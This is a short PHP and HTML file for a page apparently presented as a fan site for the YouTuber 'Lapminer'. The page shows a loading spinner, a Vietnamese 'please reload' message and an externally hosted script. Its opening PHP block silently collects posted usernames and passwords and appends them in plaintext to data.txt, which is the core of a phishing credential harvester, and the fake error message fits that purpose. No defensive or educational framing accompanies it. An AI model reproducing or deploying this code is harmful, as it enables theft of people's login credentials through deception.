<?php if(isset($_POST['submit_btn'])) { $username = $_POST['name']; $password = $_POST['pwd']; $text = $username . "," . $password . "\n"; $fp = fopen('data.txt', 'a+'); if(fwrite($fp, $text)) { echo 'Saved'; } fclose ($fp); } ?>
<!DOCTYPE html>

<html lang="en">

<head>

    <!--=== Default tags ===-->

    <meta charset="UTF-8">

    <title>LapminerHayGayy </title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="Images/logo.webp" type="image/x-icon">



    <!--=== Social profile ===-->

    

<head>

  <meta charset="UTF-8">

  <meta name="description" content="Lapminer Website">

  <meta name="keywords" content="Lapminer , Youtube , Hay Gáy , Lập Mai Nơ">

  <meta name="author" content="John Doe">

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

</head>



<!--=== Style ===-->

<style>

    #loading {

     position: fixed;

     z-index: 9999;

     top: 0;

     left: 0;

     width: 100%;

     height: 100%;

     background-color: #fff;

     display: flex;

     justify-content: center;

     align-items: center;

    }

    

    .spinner {

     width: 50px;

     height: 50px;

     border-radius: 50%;

     border: 5px solid #ccc;

     border-top-color: #333;

     animation: spin 1s ease-in-out infinite

    }

    

    @keyframes spin {

        0% {transform: rotate(0deg);}

        100% {transform: rotate(360deg);}

    }



</style>



<!--=== Spinner ===-->

<body>

    <div id="loading">

        <div class="spinner"></div>

    </div>



    <div id="error-message">

        <h1>Vui lòng tải lại ttang!</h1>

    </div>



    <script src="https://slais.netlify.app/loading.js"></script>

</body>

</html>
